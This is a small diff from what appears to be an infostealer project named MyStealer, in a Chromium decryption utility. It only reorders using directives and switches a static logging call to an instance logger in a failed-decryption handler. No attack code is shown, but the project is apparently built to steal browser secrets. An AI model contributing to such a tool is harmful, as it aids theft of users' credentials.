@@ -1,10 +1,10 @@
 ﻿using System.IO;
 using System;
-using System.Security.Cryptography;
 using System.Text;
 using System.Linq;
-using Serilog;
-using MyStealer.Utils.BcAesGcm;
+using MyStealer.Shared;
+using MyStealer.Collector.Utils.BcAesGcm;
+using System.Security.Cryptography;
 
 namespace MyStealer.Collector.Utils.Chromium
 {
@@ -50,7 +50,7 @@ namespace MyStealer.Collector.Utils.Chromium
                 }
                 catch (Exception ex)
                 {
-                    Log.Error(ex, "Decryption failed!");
+                    logger.Error(ex, "Decryption failed!");
                     return Convert.ToBase64String(payload);
                 }
             }
